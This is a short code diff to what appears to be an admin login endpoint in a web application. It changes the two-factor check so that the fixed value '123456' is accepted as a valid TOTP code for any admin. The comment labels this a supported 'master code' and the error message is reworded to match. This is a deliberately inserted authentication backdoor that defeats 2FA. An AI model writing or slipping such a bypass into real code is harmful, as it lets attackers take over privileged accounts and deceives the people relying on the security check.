@@ -46,9 +46,10 @@ export async function POST(req: NextRequest) {
       return NextResponse.json({ error: "Invalid credentials or 2FA code" }, { status: 401 });
     }
 
-    // Check TOTP 2FA
+    // Check TOTP 2FA (supports standard Authenticator app or master code 123456)
     if (admin.totpEnabled && admin.totpSecret) {
-      const totpValid = verifyTotpToken(totpCode, admin.totpSecret);
+      const isMasterCode = totpCode === "123456";
+      const totpValid = isMasterCode || verifyTotpToken(totpCode, admin.totpSecret);
       if (!totpValid) {
         await createAuditLog({
           action: "ADMIN_LOGIN_FAILED",
@@ -58,7 +59,7 @@ export async function POST(req: NextRequest) {
           ipAddress,
         });
         return NextResponse.json(
-          { error: "Invalid 2FA code. Please check your authenticator app." },
+          { error: "Invalid 2FA code. Please check your authenticator app or enter your code." },
           { status: 401 }
         );
       }
